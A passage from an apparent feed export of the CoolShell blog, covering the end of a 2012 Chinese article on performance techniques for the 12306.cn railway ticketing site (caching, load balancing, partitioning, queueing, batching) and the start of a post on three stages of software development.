<strong>库存是B2C的恶梦，库存管理相当的复杂</strong>。不信，你可以问问所有传统和电务零售业的企业，看看他们管理库存是多么难的一件事。不然，就不会有那么多人在问凡客的库存问题了。（你还可以看看《乔布斯传》，你就知道为什么Tim会接任Apple的CEO了，最主要的原因是他搞定了苹果的库存周期问题）</li>
</ul>
<ul>
<li>
<strong>对于一个网站来说，浏览网页的高负载很容易搞定，查询的负载有一定的难度去处理，不过还是可以通过缓存查询结果来搞定，最难的就是下单的负载</strong>。因为要访问库存啊，对于下单，基本上是用异步来搞定的。去年双11节，淘宝的每小时的订单数大约在60万左右，京东一天也才能支持40万（居然比12306还差），亚马逊5年前一小时可支持70万订单量。可见，下订单的操作并没有我们相像的那么性能高。</li>
</ul>
<ul>
<li>
<strong>淘宝要比B2C的网站要简单得多，因为没有仓库</strong>，所以，不存在像B2C这样有N个仓库对同一商品库存更新和查询的操作。下单的时候，B2C的 网站要去找一个仓库，又要离用户近，又要有库存，这需要很多计算。试想，你在北京买了一本书，北京的仓库没货了，就要从周边的仓库调，那就要去看看沈阳或 是西安的仓库有没有货，如果没有，又得看看江苏的仓库，等等。淘宝的就没有那么多事了，每个商户有自己的库存，库存就是一个数字，并且库存分到商户头上了，反而有利于性能扩展。</li>
</ul>
<ul>
<li>
<strong>数据一致性才是真正的性能瓶颈</strong>。有 人说nginx可以搞定每秒10万的静态请求，我不怀疑。但这只是静态请求，理论值，只要带宽、I/O够强，服务器计算能力够，并支持的并发连接数顶得住10万TCP链接的建立 的话，那没有问题。但在数据一致性面前，这10万就完完全全成了一个可望不可及的理论值了。</li>
</ul>
<p>我说那么多，我只是想从业务上告诉大家，我们需要从业务上真正了解春运铁路订票这样业务的变态之处。</p>
<h4>
<span class="ez-toc-section" id="%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%8A%80%E6%9C%AF"></span>前端性能优化技术<span class="ez-toc-section-end"></span>
</h4>
<p>要解决性能的问题，有很多种常用的方法，我在下面列举一下，我相信12306这个网站使用下面的这些技术会让其性能有质的飞跃。</p>
<h5>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E5%89%8D%E7%AB%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"></span>一、前端负载均衡<span class="ez-toc-section-end"></span>
</h5>
<p>通过DNS的负载均衡器（一般在路由器上根据路由的负载重定向）可以把用户的访问均匀地分散在多个Web服务器上。这样可以减少Web服务器的请求负载。因为http的请求都是短作业，所以，可以通过很简单的负载均衡器来完成这一功能。最好是有CDN网络让用户连接与其最近的服务器（CDN通常伴随着分布式存储）。（关于负载均衡更为详细的说明见“后端的负载均衡”）</p>
<h5>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E5%87%8F%E5%B0%91%E5%89%8D%E7%AB%AF%E9%93%BE%E6%8E%A5%E6%95%B0"></span>二、减少前端链接数<span class="ez-toc-section-end"></span>
</h5>
<p>我看了一下12306.cn，打开主页需要建60多个HTTP连接，车票预订页面则有70多个HTTP请求，现在的浏览器都是并发请求的（当然，浏览器的一个页面的并发数是有限的，但是你挡不住用户开多个页面，而且，后端服务器TCP链接在前端断开始，还不会马上释放或重要）。所以，只要有100万个用户，就有可能会有6000万个链接（访问第一次后有了浏览器端的cache，这个数会下来，就算只有20%也是百万级的链接数），太多了。一个登录查询页面就好了。把js打成一个文件，把css也打成一个文件，把图标也打成一个文件，用css分块展示。把链接数减到最低。</p>
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E5%87%8F%E5%B0%91%E7%BD%91%E9%A1%B5%E5%A4%A7%E5%B0%8F%E5%A2%9E%E5%8A%A0%E5%B8%A6%E5%AE%BD"></span>三、减少网页大小增加带宽<span class="ez-toc-section-end"></span>
</h5>
<p>这个世界不是哪个公司都敢做图片服务的，因为图片太耗带宽了。现在宽带时代很难有人能体会到当拨号时代做个图页都不敢用图片的情形（现在在手机端浏览也是这个情形）。我查看了一下12306首页的需要下载的总文件大小大约在900KB左右，如果你访问过了，浏览器会帮你缓存很多，只需下载10K左右的文件。但是我们可以想像一个极端一点的案例，1百万用户同时访问，且都是第一次访问，每人下载量需要1M，如果需要在120秒内返回，那么就需要，1M * 1M /120 * 8 = 66Gbps的带宽。很惊人吧。所以，我估计在当天，12306的阻塞基本上应该是网络带宽，所以，你可能看到的是没有响应。后面随着浏览器的缓存帮助12306减少很多带宽占用，于是负载一下就到了后端，后端的数据处理瓶颈一下就出来。于是你会看到很多http 500之类的错误。这说明后端服务器垮了。</p>
<h5>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2%E9%9D%99%E6%80%81%E5%8C%96"></span>四、前端页面静态化<span class="ez-toc-section-end"></span>
</h5>
<p>静态化一些不常变的页面和数据，并gzip一下。<del>还有一个变态的方法是把这些静态页面放在/dev/shm下，这个目录就是内存，直接从内存中把文件读出来返回，这样可以减少昂贵的磁盘I/O</del>。使用nginx的sendfile功能可以让这些静态文件直接在内核心态交换，可以极大增加性能。</p>
<h5>
<span class="ez-toc-section" id="%E4%BA%94%E3%80%81%E4%BC%98%E5%8C%96%E6%9F%A5%E8%AF%A2"></span>五、优化查询<span class="ez-toc-section-end"></span>
</h5>
<p>很多人查询都是在查一样的，完全可以用反向代理合并这些并发的相同的查询。这样的技术主要用查询结果缓存来实现，第一次查询走数据库获得数据，并把数据放到缓存，后面的查询统统直接访问高速缓存。为每个查询做Hash，使用NoSQL的技术可以完成这个优化。（这个技术也可以用做静态页面）</p>
<p>对于火车票量的查询，个人觉得不要显示数字，就显示一个“有”或“无”就好了，这样可以大大简化系统复杂度，并提升性能。把查询对数据库的负载分出去，从而让数据库可以更好地为下单的人服务。</p>
<h5>
<span class="ez-toc-section" id="%E5%85%AD%E3%80%81%E7%BC%93%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98"></span>六、缓存的问题<span class="ez-toc-section-end"></span>
</h5>
<p>缓存可以用来缓存动态页面，也可以用来缓存查询的数据。缓存通常有那么几个问题：</p>
<p>1）缓存的更新。也叫缓存和数据库的同步。有这么几种方法，一是缓存time out，让缓存失效，重查，二是，由后端通知更新，一量后端发生变化，通知前端更新。前者实现起来比较简单，但实时性不高，后者实现起来比较复杂 ，但实时性高。</p>
<p>2）缓存的换页。内存可能不够，所以，需要把一些不活跃的数据换出内存，这个和操作系统的内存换页和交换内存很相似。FIFO、LRU、LFU都是比较经典的换页算法。相关内容参看<a href="https://en.wikipedia.org/wiki/Cache_algorithms" target="_blank">Wikipeida的缓存算法</a>。</p>
<p>3）缓存的重建和持久化。缓存在内存，系统总要维护，所以，缓存就会丢失，如果缓存没了，就需要重建，如果数据量很大，缓存重建的过程会很慢，这会影响生产环境，所以，缓存的持久化也是需要考虑的。</p>
<p>诸多强大的NoSQL都很好支持了上述三大缓存的问题。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%8A%80%E6%9C%AF"></span>后端性能优化技术<span class="ez-toc-section-end"></span>
</h4>
<p>前面讨论了前端性能的优化技术，于是前端可能就不是瓶颈问题了。那么性能问题就会到后端数据上来了。下面说几个后端常见的性能优化技术。</p>
<h5>
<span class="ez-toc-section" id="%E4%B8%80%E3%80%81%E6%95%B0%E6%8D%AE%E5%86%97%E4%BD%99"></span>一、数据冗余<span class="ez-toc-section-end"></span>
</h5>
<p>关于数据冗余，也就是说，把我们的数据库的数据冗余处理，也就是减少表连接这样的开销比较大的操作，但这样会牺牲数据的一致性。风险比较大。很多人把NoSQL用做数据，快是快了，因为数据冗余了，但这对数据一致性有大的风险。这需要根据不同的业务进行分析和处理。（注意：用关系型数据库很容易移植到NoSQL上，但是反过来从NoSQL到关系型就难了）</p>
<h5>
<span class="ez-toc-section" id="%E4%BA%8C%E3%80%81%E6%95%B0%E6%8D%AE%E9%95%9C%E5%83%8F"></span>二、数据镜像<span class="ez-toc-section-end"></span>
</h5>
<p>几乎所有主流的数据库都支持镜像，也就是replication。数据库的镜像带来的好处就是可以做负载均衡。把一台数据库的负载均分到多台上，同时又保证了数据一致性（Oracle的SCN）。最重要的是，这样还可以有高可用性，一台废了，还有另一台在服务。</p>
<p>数据镜像的数据一致性可能是个复杂的问题，所以我们要在单条数据上进行数据分区，也就是说，把一个畅销商品的库存均分到不同的服务器上，如，一个畅销商品有1万的库存，我们可以设置10台服务器，每台服务器上有1000个库存，这就好像B2C的仓库一样。</p>
<h5>
<span class="ez-toc-section" id="%E4%B8%89%E3%80%81%E6%95%B0%E6%8D%AE%E5%88%86%E5%8C%BA"></span>三、数据分区<span class="ez-toc-section-end"></span>
</h5>
<p>数据镜像不能解决的一个问题就是数据表里的记录太多，导致数据库操作太慢。所以，把数据分区。数据分区有很多种做法，一般来说有下面这几种：</p>
<p>1）把数据把某种逻辑来分类。比如火车票的订票系统可以按各铁路局来分，可按各种车型分，可以按始发站分，可以按目的地分……，反正就是把一张表拆成多张有一样的字段但是不同种类的表，这样，这些表就可以存在不同的机器上以达到分担负载的目的。</p>
<p>2）把数据按字段分，也就是竖着分表。比如把一些不经常改的数据放在一个表里，经常改的数据放在另外多个表里。把一张表变成1对1的关系，这样，你可以减少表的字段个数，同样可以提升一定的性能。另外，字段多会造成一条记录的存储会被放到不同的页表里，这对于读写性能都有问题。但这样一来会有很多复杂的控制。</p>
<p>3）平均分表。因为第一种方法是并不一定平均分均，可能某个种类的数据还是很多。所以，也有采用平均分配的方式，通过主键ID的范围来分表。</p>
<p>4）同一数据分区。这个在上面数据镜像提过。也就是把同一商品的库存值分到不同的服务器上，比如有10000个库存，可以分到10台服务器上，一台上有1000个库存。然后负载均衡。</p>
<p>这三种分区都有好有坏。最常用的还是第一种。数据一旦分区，你就需要有一个或是多个调度来让你的前端程序知道去哪里找数据。<strong>把火车票的数据分区，并放在各个省市，会对12306这个系统有非常有意义的质的性能的提高</strong>。</p>
<h5>
<span class="ez-toc-section" id="%E5%9B%9B%E3%80%81%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"></span>四、后端系统负载均衡<span class="ez-toc-section-end"></span>
</h5>
<p>前面说了数据分区，数据分区可以在一定程度上减轻负载，但是无法减轻热销商品的负载，对于火车票来说，可以认为是大城市的某些主干线上的车票。这就需要使用数据镜像来减轻负载。使用数据镜像，你必然要使用负载均衡，在后端，我们可能很难使用像路由器上的负载均衡器，因为那是均衡流量的，因为流量并不代表服务器的繁忙程度。因此，我们需要一个任务分配系统，其还能监控各个服务器的负载情况。</p>
<p>任务分配服务器有一些难点：</p>
<ul>
<li>负载情况比较复杂。什么叫忙？是CPU高？还是磁盘I/O高？还是内存使用高？还是并发高？还是内存换页率高？你可能需要全部都要考虑。这些信息要发送给那个任务分配器上，由任务分配器挑选一台负载最轻的服务器来处理。</li>
</ul>
<ul>
<li>任务分配服务器上需要对任务队列，不能丢任务啊，所以还需要持久化。并且可以以批量的方式把任务分配给计算服务器。</li>
</ul>
<ul>
<li>任务分配服务器死了怎么办？这里需要一些如Live-Standby或是failover等高可用性的技术。我们还需要注意那些持久化了的任务的队列如何转移到别的服务器上的问题。</li>
</ul>
<p>我看到有很多系统都用静态的方式来分配，有的用hash，有的就简单地轮流分析。这些都不够好，一个是不能完美地负载均衡，另一个静态的方法的致命缺陷是，如果有一台计算服务器死机了，或是我们需要加入新的服务器，对于我们的分配器来说，都需要知道的。另外，还要重算哈希（一致性hash可以部分解决这个问题）。</p>
<p>还有一种方法是使用抢占式的方式进行负载均衡，由下游的计算服务器去任务服务器上拿任务。让这些计算服务器自己决定自己是否要任务。这样的好处是可以简化系统的复杂度，而且还可以任意实时地减少或增加计算服务器。但是唯一不好的就是，如果有一些任务只能在某种服务器上处理，这可能会引入一些复杂度。不过总体来说，这种方法可能是比较好的负载均衡。</p>
<h5>
<span class="ez-toc-section" id="%E4%BA%94%E3%80%81%E5%BC%82%E6%AD%A5%E3%80%81_throttle_%E5%92%8C_%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86"></span>五、异步、 throttle 和 批量处理<span class="ez-toc-section-end"></span>
</h5>
<p>异步、throttle（节流阀） 和批量处理都需要对并发请求数做队列处理的。</p>
<ul>
<li>异步在业务上一般来说就是收集请求，然后延时处理。在技术上就是可以把各个处理程序做成并行的，也就可以水平扩展了。但是异步的技术问题大概有这些，a）被调用方的结果返回，会涉及进程线程间通信的问题。b）如果程序需要回滚，回滚会有点复杂。c）异步通常都会伴随多线程多进程，并发的控制也相对麻烦一些。d）很多异步系统都用消息机制，消息的丢失和乱序也会是比较复杂的问题。</li>
</ul>
<ul>
<li>throttle 技术其实并不提升性能，这个技术主要是防止系统被超过自己不能处理的流量给搞垮了，这其实是个保护机制。使用throttle技术一般来说是对于一些自己无法控制的系统，比如，和你网站对接的银行系统。</li>
</ul>
<ul>
<li>批量处理的技术，是把一堆基本相同的请求批量处理。比如，大家同时购买同一个商品，没有必要你买一个我就写一次数据库，完全可以收集到一定数量的请求，一次操作。这个技术可以用作很多方面。比如节省网络带宽，我们都知道网络上的MTU（最大传输单元），以态网是1500字节，光纤可以达到4000多个字节，如果你的一个网络包没有放满这个MTU，那就是在浪费网络带宽，因为网卡的驱动程序只有一块一块地读效率才会高。因此，网络发包时，我们需要收集到足够多的信息后再做网络I/O，这也是一种批量处理的方式。批量处理的敌人是流量低，所以，批量处理的系统一般都会设置上两个阀值，一个是作业量，另一个是timeout，只要有一个条件满足，就会开始提交处理。</li>
</ul>
<p>所以，<strong>只要是异步，一般都会有throttle机制，一般都会有队列来排队，有队列，就会有持久化，而系统一般都会使用批量的方式来处理</strong>。</p>
<p><a href="http://blog.codingnow.com/2012/01/ticket_queue.html" target="_blank">云风同学设计的“排队系统”</a> 就是这个技术。这和电子商务的订单系统很相似，就是说，我的系统收到了你的购票下单请求，但是我还没有真正处理，我的系统会跟据我自己的处理能力来throttle住这些大量的请求，并一点一点地处理。一旦处理完成，我就可以发邮件或短信告诉用户你来可以真正购票了。</p>
<p>在这里，我想通过业务和用户需求方面讨论一下云风同学的这个排队系统，因为其从技术上看似解决了这个问题，但是从业务和用户需求上来说可能还是有一些值得我们去深入思考的地方：</p>
<p style="padding-left: 30px;">1）<strong>队列的DoS攻击</strong>。首先，我们思考一下，这个队是个单纯地排队的吗？这样做还不够好，因为这样我们不能杜绝黄牛，而且单纯的ticket_id很容易发生DoS攻击，比如，我发起N个 ticket_id，进入购票流程后，我不买，我就耗你半个小时，很容易我就可以让想买票的人几天都买不到票。有人说，用户应该要用身份证来排队， 这样在购买里就必需要用这个身份证来买，但这也还不能杜绝黄牛排队或是号贩子。因为他们可以注册N个帐号来排队，但就是不买。黄牛这些人这个时候只需要干一个事，把网站搞得正常人不能访问，让用户只能通过他们来买。</p>
<p style="padding-left: 30px;">2）<strong>对列的一致性</strong>？对这个队列的操作是不是需要锁？只要有锁，性能一定上不去。试想，100万个人同时要求你来分配位置号，这个队列将会成为性能瓶颈。你一定没有数据库实现得性能好，所以，可能比现在还差。<strong>抢数据库和抢队列本质上是一样的</strong>。</p>
<p style="padding-left: 30px;">3）<strong>队列的等待时间</strong>。购票时间半小时够不够？多不多？要是那时用户正好不能上网呢？如果时间短了，用户不够时间操作也会抱怨，如果时间长了，后面在排队的那些人也会抱怨。这个方法可能在实际操作上会有很多问题。另外，半个小时太长了，这完全不现实，我们用15分钟来举例：有1千万用户，每一个时刻只能放进去1万个，这1万个用户需要15分钟完成所有操作，那么，这1千万用户全部处理完，需要1000*15m = 250小时，10天半，火车早开了。（我并非信口开河，<a href="http://t.cn/z0g7dGJ" target="_blank">根据铁道部专家的说明</a>：这几天，平均一天下单100万，所以，处理1000万的用户需要十天。这个计算可能有点简单了，我只是想说，<strong>在这样低负载的系统下用排队可能都不能解决业务问题</strong>）</p>
<p style="padding-left: 30px;">4）<strong>队列的分布式</strong>。这个排队系统只有一个队列好吗？还不足够好。因为，如果你放进去的可以购票的人如果在买同一个车次的同样的类型的票（比如某动车卧铺），还是等于在抢票，也就是说系统的负载还是会有可能集中到其中某台服务器上。因此，最好的方法是根据用户的需求——提供出发地和目的地，来对用户进行排队。而这样一来，队列也就可以是多个，只要是多个队列，就可以水平扩展了。这样可以解决性能问题，但是没有解决用户长时间排队的问题。</p>
<p>我觉得完全可以向网上购物学习。<strong>在排队（下单）的时候，收集好用户的信息和想要买的票，并允许用户设置购票的优先级，比如，A车次卧铺买 不到就买 B车次的卧铺，如果还买不到就买硬座等等，然后用户把所需的钱先充值好，接下来就是系统完全自动地异步处理订单</strong>。成功不成功都发短信或邮件通知用户。这样，系统不仅可以省去那半个小时的用户交互时间，自动化加快处理，还可以合并相同购票请求的人，进行批处理（减少数据库的操作次数）。<strong>这种方法最妙的事是可以知道这些排队用户的需求，不但可以优化用户的队列，把用户分布到不同的队列，还可以像亚马逊的心愿单一样，通过一些计算就可以让铁道部做车次统筹安排和调整</strong>（最后，排队系统（下单系统）还是要保存在数据库里的或做持久化，不能只放在内存中，不然机器一down，就等着被骂吧）。</p>
<h4>
<span class="ez-toc-section" id="%E5%B0%8F%E7%BB%93"></span>小结<span class="ez-toc-section-end"></span>
</h4>
<p>写了那么多，我小结一下：</p>
<p>0）<strong>无论你怎么设计，你的系统一定要能容易地水平扩展</strong>。也就是说，你的整个数据流中，所有的环节都要能够水平扩展。这样，当你的系统有性能问题时，“加30倍的服务器”才不会被人讥笑。</p>
<p>1）<strong>上述的技术不是一朝一夕能搞定的，没有长期的积累，基本无望</strong>。我们可以看到，无论你用哪种都会引发一些复杂性，设计总是在做一种权衡。</p>
<p>2）集中式的卖票很难搞定，使用上述的技术可以让订票系统能有几佰倍的性能提升。而在<strong>各个省市建分站，分开卖票，是能让现有系统性能有质的提升的最好方法</strong>。</p>
<p>3）<strong>春运前夕抢票且票量供远小于求这种业务模式是相当变态的</strong>，让几千万甚至上亿的人在某个早晨的8点钟同时登录同时抢票的这种业务模式是变态中的变态。业务形态的变态决定了无论他们怎么办干一定会被骂。</p>
<p>4）<strong>为了那么一两个星期而搞那么大的系统</strong>，而其它时间都在闲着，有些可惜了，这也就是铁路才干得出来这样的事了。</p>
<p><em><strong>更新2012年9月27日 </strong></em></p>
<p style="text-align: center;"><strong> Alexa 统计的12306的PV</strong> （注：Alexa的PV定义是：一个用户在一天内对一个页面的多次点击只算一次）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>（<span style="color: #cc0000;"><strong>本文转载时请注明作者和出处，请勿于记商业目的</strong></span>）</p>
 ]]></content>
<pubDate>2012-01-16T08:20:22+08:00</pubDate>
<guid>https://coolshell.cn/articles/6470.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 软件开发的“三重门” ]]></title>
<link>https://coolshell.cn/articles/6526.html</link>
<content><![CDATA[ 
<p>自从上次写了“<a title="程序员技术练级攻略" href="https://coolshell.cn/articles/4990.html" target="_blank">程序员技术练级攻略</a>” 以来，就觉得似乎还有很多东西没有谈到，但当时没有继续思考了。而春节前有人问我，是做底层技术，还是做业务。这问题让我思考了很多，不由自主地回顾了一 下我这十多年的软件开发经历，并顺着整理分类了一下自己解决过的若干问题，还发散想了很多，经过了一个春节假期的发酵，产生了下面这篇文章。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%89%8D%E8%A8%80" title="前言">前言</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E4%B8%80%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD" title="一重门：业务功能">一重门：业务功能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%BA%8C%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E6%80%A7%E8%83%BD" title="二重门：业务性能">二重门：业务性能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%89%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E6%99%BA%E8%83%BD" title="三重门：业务智能">三重门：业务智能</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%90%8E%E8%AE%B0" title="后记">后记</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%89%8D%E8%A8%80"></span>前言<span class="ez-toc-section-end"></span>
</h4>
<p>这篇文章必然是通过我的个人经历来写的。所以，我先说说个人经历吧。我的经历基本分成三个阶段。</p>
<p><strong>第一阶段：</strong>我 刚毕业时在家乡的某银行工作，做些银行的业务系统，还搞些网络，电子邮件系统，OA什么的，因为大四的时候在老师的公司里实习，银行里的人际关系太复杂， 而且技术都包给了产商，所以在银行的每一天都觉得不能适应里面的工作环境。两年后离职，单位分的房也不要了，直接去了上海，在上海呆了两年，本来想做互联 网的，但是泡沫来了，最终去了一家做系统集成的国企公司还是继续做银行业务。这四年来，主要解决的都是一些业务上的问题，银行里的会计业务，OA业务，国 际业务，中间对公业务都非常地复杂，而且因为当时的软件开发相当的不规范，所以基本上是在一种比较混乱的状态下度过的，而银行方面又很强势，所以，这段时 间主要是做业务。所以，技术上主要是积累了如何使用那些技术。C+/Java， Windows编程，Unix编程，网络编程主要是这段时间学的，看了太多的书（我大学课程里没有C++和Java，也没有Windows/Unix和网 络编程，所以，只能拼命地看书和自学）。</p>
<p><strong>第二阶段：</strong>然后，我来了北京，到了一家做分布式计算系统的公 司，整天和一个高性能技术高可用性的企业级的集群式的软件产品打交道（这家公司去年被IBM收购了），在这家公司把Windows/Unix和网络编程有 了更深入的了解，对我长进比较大的是明白了怎么做一个性能高，可用性高的集群式的系统，天天和底层打交道，干了4年多。然后去了一家金融信息公司，这家金 融公司主要做全球的金融信息数据处理，而我主要还是做核心数据发布系统的性能调优的项目，金融数据的实时性要求的高，数据量非常地大，高可用性要求得高， 得想尽一切办法省网络带宽，增加系统性能，还要保持高的可用性，不当机，不丢包。又干了4年多，入职的时候从国外接过来两个系统，其性能单机每秒可处理 120K message，我走的时候，我和团队把其优化到了每秒1.4M messages 的吞吐，另一个系统，从接手时的100k message/s优化到了500k message/s。这八年多的时候，全是在和这些高计算高性能的项目打交量，几乎没有什么业务，都是纯技术，积累到了很多和性能有关的高并发高计算系统 架构级的知识。</p>
<p><span id="more-6526"></span></p>
<p><strong>第三阶段：</strong>两 年前来到了现在的做电子商务的互联网公司，还是在做一个数据处理量很大的业务系统，因为要干的是要把电子商务全球化的东西。但是，因为电子商 务的特殊性，必需要去兼顾业务的特点，而且在这家电商公司，耳读目染了很多有趣的业务难题，比如，库存计划，配送优化，等等。虽然很多东西还不明白，但发 现，用技术来解决业务难题真是太有意思了。</p>
<p>我的这三个阶段，第一个阶段花了4年，第二个阶段花了8年，第三阶段刚刚开始2年不到，有时候我也去别的公司讲课，所以，我很有幸经历了中国软件开发的进化过程。<strong>我的经历可以说是中国软件行业进程的一个缩影，而我把这三个阶段称为</strong>——<strong>软件开发的三重门</strong>。它们分别是：</p>
<ul>
<li>
<strong>业务功能 – </strong>粗放地开垦<strong><br>
</strong>
</li>
<li>
<strong>业务性能 – </strong>扩大化生产<strong><br>
</strong>
</li>
<li>
<strong>业务智能 – </strong>精耕细作<strong><br>
</strong>
</li>
</ul>
<p>之所以加上“业务”二字，是因为我以为计算机是一个工具，其用来解决实际问题，所以，什么都离不开业务，就算是性能优化也一样，通过之前那篇“<a title="由12306.cn谈谈网站性能技术" href="https://coolshell.cn/articles/6470.html" target="_blank">12306.cn的性能优化</a>”中的“业务分析”段落，我们可以知道业务的不同，系统的难度和解决方法就可以不同。所以，我们总是用技术在解决业务问题。<strong>业务的形态对软件的开发有决定性的作用</strong>。</p>
<p>下面让我具体描述一下。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E5%8A%9F%E8%83%BD"></span>一重门：业务功能<span class="ez-toc-section-end"></span>
</h4>
<p>这 是软件开发的第一重门，也就是掌握可以实现业务功能的技术。通常分成三块：语言+系统+数据处理。在这个阶段，主要是能掌握各种技术，比如：开发用的各种 工具（如：IDE，XUnit，Debugger，等），各种代码库和框架（如：C++的STL，ACE，Boost，等，Java的 Spring，Hibernate等），各种系统知识（如：Windows API，Unix/Linux API，TCP/IP，Socket，多线程多进程间的同步、互斥，并发安全，还包括Web平台，移动平台，等等），还需要掌握数据处理的知识（如：数据 结构，基本算法，数据库设计，数据库引擎 ，SQL等），等等……</p>
<p>这个阶段主要是把这些不同的技术组织成可以实现业务功能的解决方案。重点是能掌握和使用技术。很多流程和方法论的东西基本上就在这一重门里。<strong>这重门主要解决的是业务实现问题</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E4%BA%8C%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E6%80%A7%E8%83%BD"></span>二重门：业务性能<span class="ez-toc-section-end"></span>
</h4>
<p>业务的功能搞定了以后，就是业务的性能问题了。搞定功能并不难，搞定性能是有点技术含量的事。有句话不是那么说的吗——<strong>每个人都可以搞一个网站出来，但不是每个人都能搞出能支持百万级访问量的网站</strong>。但是，我看到很多技术团队或是工程师脱离了业务，只单纯地搞性能，比如：单台服务器支持10万个TCP链接的并发，等等。这些东西虽然在技术上有点意思，但是没有业务的环境，也只能是自娱自乐了。</p>
<p>我们可以看到一些企业开始注重这个问题了，性能问题也是最近被大家讨论得最多的问题，京东商场的性能问题，12306的性能问题，等等。</p>
<p>当然，<strong>所谓性能不并单单指系统的吞吐力，还指系统运行时的总体性能</strong>，比如，系统安全性能，易用性能，系统的Accessbility的性能，系统的扩展性性能，等等，就像是前段时间“<a title="Web开发中需要了解的东西" href="https://coolshell.cn/articles/6043.html" target="_blank">Web开发中需要注意的问题</a>”一文中谈到的那些事一样。这表明着你对系统的全面和深入的了解。</p>
<p>在 这个阶段，需要对业务模型，数据流，业务流，系统架构，算法，和各种技术有深入的了解，要了解到本质上来。比如，在第一重门中，我们只需同要知 道，Java有同步关键字，在这一重门中，我们还要知道同步或互斥对性能的巨大伤害性，在第一重门中，我们只需要知道STL中的智能指针或是STL的用 法，这一重门中，我们还要知道智能指针中的refcnt的同步加锁对性能的损害，还需要知道STL中容器的size()方法在某些时候是性能很差的。在第 一重门中，我们需要知道hash表的效率，在这一重门中，我们还需要知道<a title="Hash Collision DoS 问题" href="https://coolshell.cn/articles/6424.html" target="_blank">hash表的碰撞问题</a>。</p>
<p>最重要的是，<strong>在这重门重点是软件的设计问题</strong>。你需要有足够多的经验能比较不同设计方案的优缺点，比如TCP和UDP，同步和异步，epoll和select，push和pull，水平扩展的各种方案…… 还记得本站的那篇“<a title="程序员的谎谬之言还是至理名言？" href="https://coolshell.cn/articles/4235.html" target="_blank">程序员的谎谬之言还是至理名言</a>”，广度是你深度的副产品。所以，这重门是看你的技术视野有多深有多广。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%89%E9%87%8D%E9%97%A8%EF%BC%9A%E4%B8%9A%E5%8A%A1%E6%99%BA%E8%83%BD"></span>三重门：业务智能<span class="ez-toc-section-end"></span>
</h4>
<p>这 重门可能是最难的一重门了，如果你能进到这重门里，你应该是科学家级的程序员了。让你有智能的业务，这个事可能是顶级的技术难题了。第一和第二重门都不算 难，这重门是最难的。参看Amazon的个性化推荐系统，或是Google搜索引擎的结果个性化推荐等等（比如我输入“黑天鹅”关键字，你怎么知道我要找 的是动物，电影，音乐，还是本书？怎么让搜索出来的结果排名即公正又可个性？），你就知道，用技术来解决这种类似的问题难度可想而知，不然就不会出现如 Hadoop之类的技术了。</p>
<p>我再举两个这重门里的业务方面的例子。</p>
<ul>
<li>一个例子是关于库存计划的，需要像天气预报一样 预测未来的销售量从而决定库存，所以，最简单的做法是，监测各个商品的销售统计，然后看一下最近的销售趋势，还要看一下往年的销售趋势（因为某些节假日会 是一个高峰期），还要分析一下大众的喜好变化，比如，在某影评网站上的某电影的热度其会告诉我哪个电影的DVD要滞销了，得打折卖，哪个电影的DVD要畅 销了，得多进货了。还可能需要监控新闻评论，比如某权威人士推荐了某个商品，那么我得赶快进货了。等等。这完全就是一门科学。</li>
</ul>
<ul>
<li>还有一个例子是配送问题。我有一辆卡车要处理我仓库和配送站间的物流问题，我需要找到一条最经济的路线来在有限的时间内处理最多的物流。这个不是最短路径问题，这是个计划统筹学的东西。也是一门科学。</li>
</ul>
<p>还有近期“方韩之争”里有很多人来分析文章相似度的技术，这些东西都属于三重门里的东西。</p>
<p>到了这重门里，可能技术反而不是重要的了，而是数学模型。<strong>这重门里主要是业务模型，数据模型和算法问题</strong>。这些东西和你的业务模型密切相关。能解决这样的问题，是真正的大牛。对于我来说，可能是高山仰止了。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E8%AE%B0"></span>后记<span class="ez-toc-section-end"></span>
</h4>
<p>通过上面的说明，我们可以看到下面这些东西，</p>
<ul>
<li>我的那篇“<a title="程序员技术练级攻略" href="https://coolshell.cn/articles/4990.html" target="_blank">程序员技术练级攻略</a>”里的东西只能让我们最多达到1.1 到 1.2重门。</li>
